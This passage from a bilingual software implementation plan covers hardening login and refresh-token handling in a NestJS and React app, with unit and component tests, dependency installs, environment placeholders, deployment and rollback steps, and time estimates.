      ).rejects.toThrow(UnauthorizedException);
    });
  });

  describe('refreshAccessToken', () => {
    const mockRefreshToken = {
      id: 'token-123',
      token: 'refresh-token-abc',
      userId: 'user-123',
      user: mockUser,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      revoked: false,
    };

    it('should return new access token if refresh token valid', async () => {
      refreshTokenRepository.findOne.mockResolvedValue(mockRefreshToken as any);
      fiscalYearService.findOne.mockResolvedValue(mockFiscalYear as any);

      const result = await service.refreshAccessToken('refresh-token-abc');

      expect(result).toHaveProperty('access_token');
      expect(result).toHaveProperty('user');
      expect(result).toHaveProperty('fiscalYear');
      expect(jwtService.sign).toHaveBeenCalled();
    });

    it('should throw if refresh token not found', async () => {
      refreshTokenRepository.findOne.mockResolvedValue(null);

      await expect(
        service.refreshAccessToken('invalid-token')
      ).rejects.toThrow('Invalid refresh token');
    });

    it('should throw if refresh token expired', async () => {
      const expiredToken = {
        ...mockRefreshToken,
        expiresAt: new Date(Date.now() - 1000),
      };
      refreshTokenRepository.findOne.mockResolvedValue(expiredToken as any);

      await expect(
        service.refreshAccessToken('refresh-token-abc')
      ).rejects.toThrow('Refresh token expired');
    });

    it('should throw if refresh token revoked', async () => {
      const revokedToken = { ...mockRefreshToken, revoked: true };
      refreshTokenRepository.findOne.mockResolvedValue(revokedToken as any);

      await expect(
        service.refreshAccessToken('refresh-token-abc')
      ).rejects.toThrow('Invalid refresh token');
    });
  });

  describe('revokeRefreshToken', () => {
    it('should revoke token', async () => {
      refreshTokenRepository.update.mockResolvedValue({ affected: 1 } as any);

      await service.revokeRefreshToken('token-abc');

      expect(refreshTokenRepository.update).toHaveBeenCalledWith(
        { token: 'token-abc' },
        { revoked: true }
      );
    });
  });

  describe('revokeAllUserTokens', () => {
    it('should revoke all user tokens', async () => {
      refreshTokenRepository.update.mockResolvedValue({ affected: 3 } as any);

      await service.revokeAllUserTokens('user-123');

      expect(refreshTokenRepository.update).toHaveBeenCalledWith(
        { userId: 'user-123', revoked: false },
        { revoked: true }
      );
    });
  });
});
```

**Run tests:**

```bash
cd backend
pnpm test -- auth.service.spec.ts
```

**✅ Success Criteria:**
- [ ] All tests pass
- [ ] >80% code coverage for AuthService

---

### 6.2 Frontend Component Tests

**📁 File:** `/opt/sikancil/frontend/src/features/auth/__tests__/LoginForm.test.tsx`

```typescript
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { BrowserRouter } from 'react-router-dom';
import { LoginForm } from '../components/LoginForm';
import { authApi } from '../api';

// Mock API
jest.mock('../api');
const mockAuthApi = authApi as jest.Mocked<typeof authApi>;

const queryClient = new QueryClient({
  defaultOptions: {
    queries: { retry: false },
    mutations: { retry: false },
  },
});

const wrapper = ({ children }: { children: React.ReactNode }) => (
  <QueryClientProvider client={queryClient}>
    <BrowserRouter>
      {children}
    </BrowserRouter>
  </QueryClientProvider>
);

describe('LoginForm', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it('renders login form with all fields', () => {
    render(<LoginForm />, { wrapper });

    expect(screen.getByLabelText(/username/i)).toBeInTheDocument();
    expect(screen.getByLabelText(/password/i)).toBeInTheDocument();
    expect(screen.getByLabelText(/tahun anggaran/i)).toBeInTheDocument();
    expect(screen.getByLabelText(/captcha/i)).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /masuk/i })).toBeInTheDocument();
  });

  it('shows validation errors for empty fields', async () => {
    render(<LoginForm />, { wrapper });

    const submitButton = screen.getByRole('button', { name: /masuk/i });
    fireEvent.click(submitButton);

    await waitFor(() => {
      expect(screen.getByText(/username wajib diisi/i)).toBeInTheDocument();
      expect(screen.getByText(/password wajib diisi/i)).toBeInTheDocument();
      expect(screen.getByText(/captcha wajib diisi/i)).toBeInTheDocument();
    });
  });

  it('toggles password visibility', async () => {
    render(<LoginForm />, { wrapper });

    const passwordInput = screen.getByLabelText(/password/i) as HTMLInputElement;
    const toggleButton = screen.getByLabelText(/tampilkan password/i);

    expect(passwordInput.type).toBe('password');

    fireEvent.click(toggleButton);

    await waitFor(() => {
      expect(passwordInput.type).toBe('text');
      expect(screen.getByLabelText(/sembunyikan password/i)).toBeInTheDocument();
    });
  });

  it('submits form with valid data', async () => {
    mockAuthApi.login.mockResolvedValue({
      user: { id: '1', username: 'test', email: 'test@test.com' },
      fiscalYear: { id: 'fy-1', tahun: 2026 },
    } as any);

    render(<LoginForm />, { wrapper });

    await userEvent.type(screen.getByLabelText(/username/i), 'testuser');
    await userEvent.type(screen.getByLabelText(/password/i), 'password123');
    await userEvent.type(screen.getByLabelText(/captcha/i), 'ABCD');

    fireEvent.click(screen.getByRole('button', { name: /masuk/i }));

    await waitFor(() => {
      expect(mockAuthApi.login).toHaveBeenCalledWith(
        expect.objectContaining({
          username: 'testuser',
          password: 'password123',
          captcha: 'ABCD',
        })
      );
    });
  });

  it('displays error message on login failure', async () => {
    mockAuthApi.login.mockRejectedValue({
      response: { data: { message: 'Username atau password salah' } },
    });

    render(<LoginForm />, { wrapper });

    await userEvent.type(screen.getByLabelText(/username/i), 'testuser');
    await userEvent.type(screen.getByLabelText(/password/i), 'wrongpassword');
    await userEvent.type(screen.getByLabelText(/captcha/i), 'ABCD');

    fireEvent.click(screen.getByRole('button', { name: /masuk/i }));

    await waitFor(() => {
      expect(screen.getByText(/username atau password salah/i)).toBeInTheDocument();
    });
  });
});
```

**Run tests:**

```bash
cd frontend
pnpm test -- LoginForm.test.tsx
```

**✅ Success Criteria:**
- [ ] All component tests pass
- [ ] Form validation tested
- [ ] User interactions tested
- [ ] Error handling tested

---

## DEPENDENCIES & INSTALLATION

### Backend Dependencies

```bash
cd backend

# Core dependencies
pnpm add @nestjs/cache-manager cache-manager
pnpm add @nestjs/schedule
pnpm add dompurify

# Dev dependencies
pnpm add -D @types/cache-manager
```

### Frontend Dependencies

```bash
cd frontend

# Core dependencies
pnpm add dompurify

# Dev dependencies
pnpm add -D @types/dompurify
pnpm add -D @testing-library/user-event
```

### Environment Variables

Update `/opt/sikancil/backend/.env`:

```env
# JWT Configuration
JWT_SECRET=<generate-64-char-random-hex>
JWT_EXPIRES_IN=15m
JWT_REFRESH_SECRET=<generate-different-64-char-random-hex>
JWT_REFRESH_EXPIRES_IN=7d

# CORS
CORS_ORIGIN=http://localhost:5173

# Node Environment
NODE_ENV=development
```

Generate secrets:

```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

---

## END-TO-END VERIFICATION

### Pre-Deployment Checklist

```bash
# Backend
[ ] pnpm run build (no errors)
[ ] pnpm run test (all tests pass)
[ ] pnpm run migration:run (all migrations applied)
[ ] JWT_SECRET configured and strong
[ ] CORS_ORIGIN configured correctly
[ ] Rate limiting tested

# Frontend
[ ] pnpm run build (no errors)
[ ] pnpm run test (all tests pass)
[ ] API_URL configured correctly
[ ] Cookies working (not localStorage)

# Integration
[ ] Login flow end-to-end
[ ] Logout clears cookies
[ ] Refresh token auto-refreshes
[ ] Rate limiting blocks excessive requests
[ ] CAPTCHA required for login/register
[ ] Password requirements enforced
[ ] Role-based access control works
[ ] Session timeout works
[ ] Accessibility tested with screen reader
```

### Manual Testing Flow

```
1. Register New User
   ✓ Strong password required
   ✓ CAPTCHA required
   ✓ Rate limited (3 per hour)
   ✓ Tokens in httpOnly cookies
   ✓ No tokens in localStorage

2. Login
   ✓ Invalid credentials → generic error
   ✓ Suspended account → generic error
   ✓ Valid credentials → success
   ✓ CAPTCHA auto-refreshes on failure
   ✓ Fiscal year dropdown loads
   ✓ Redirect to original page
   ✓ Rate limited (5 per minute)

3. Authenticated Session
   ✓ Protected routes accessible
   ✓ Role-based access enforced
   ✓ Access token expires → auto-refresh
   ✓ Session timeout after 15 min inactivity

4. Logout
   ✓ Cookies cleared
   ✓ Refresh token revoked in DB
   ✓ Redirect to login
   ✓ Cannot access protected routes

5. Security
   ✓ XSS cannot steal tokens
   ✓ CAPTCHA SVG sanitized
   ✓ Rate limiting enforced
   ✓ Timing attack mitigated
```

---

## DEPLOYMENT NOTES

### Breaking Changes

⚠️ **CRITICAL:** Migrasi ke httpOnly cookies akan logout semua user yang sedang login.

**Migration Strategy:**

```typescript
// Option 1: Seamless migration (kompleks)
// - Support both localStorage and cookies temporarily
// - Migrate users gradually
// - Remove localStorage support after 1 week

// Option 2: Hard cutover (direkomendasikan)
// - Deploy dengan cookies only
// - All users logged out
// - Send notification before deployment
```

**Deployment Steps:**

```bash
# 1. Database Migration
cd backend
pnpm run migration:run

# 2. Backend Deployment
pnpm run build
# Deploy backend first

# 3. Frontend Deployment
cd frontend
pnpm run build
# Deploy frontend after backend

# 4. Verify
# - Check cookies in browser
# - Test login flow
# - Test refresh token
# - Monitor error logs
```

### Rollback Plan

If issues occur:

```bash
# Backend Rollback
git revert <commit-hash>
pnpm run migration:revert  # If migration causes issues

# Frontend Rollback
git revert <commit-hash>
pnpm run build

# Emergency: Revert to localStorage
# 1. Comment out cookie code in auth.controller.ts
# 2. Uncomment localStorage code in auth.store.ts
# 3. Deploy quickly
```

### Monitoring

After deployment, monitor:

```bash
# Backend logs
tail -f backend/logs/error.log | grep -i "auth\|jwt\|captcha"

# Database
SELECT COUNT(*) FROM refresh_tokens WHERE revoked = false;
SELECT COUNT(*) FROM refresh_tokens WHERE "expiresAt" < NOW();

# Frontend errors (browser console)
# - Check for cookie-related errors
# - Check for 401/403 errors
# - Check for CORS errors
```

---

## ESTIMASI WAKTU FINAL

| Fase | Task Count | Estimasi | Prioritas |
|------|-----------|----------|-----------|
| Fase 1: Critical Bugs | 5 | 4-6 jam | IMMEDIATE |
| Fase 2: Critical Security | 8 | 8-10 jam | HIGH |
| Fase 3: Token Security | 2 | 10-12 jam | MEDIUM-HIGH |
| Fase 4: UX Improvements | 2 | 2-3 jam | MEDIUM |
| Fase 5: Accessibility | 1 | 2-3 jam | LOW-MEDIUM |
| Fase 6: Testing | 2 | 6-8 jam | MEDIUM |
| **TOTAL** | **20** | **32-42 jam** | **4-5 hari kerja** |

---

## CONTACT & SUPPORT

Jika ada pertanyaan atau masalah selama implementasi:

1. **Critical Bugs:** Fix immediately (Fase 1)
2. **Security Issues:** Fix as soon as possible (Fase 2)
3. **Feature Improvements:** Can be done incrementally

**Success Metrics:**
- Zero critical bugs in production
- Zero security vulnerabilities
- 100% accessibility compliance (WCAG 2.1 AA)
- >80% test coverage
- <2s login response time
- Zero user-reported auth issues

---

**Document Version:** 1.0
**Last Updated:** 2026-02-18
**Author:** Claude Code Analysis Team
**Status:** Ready for Implementation ✅
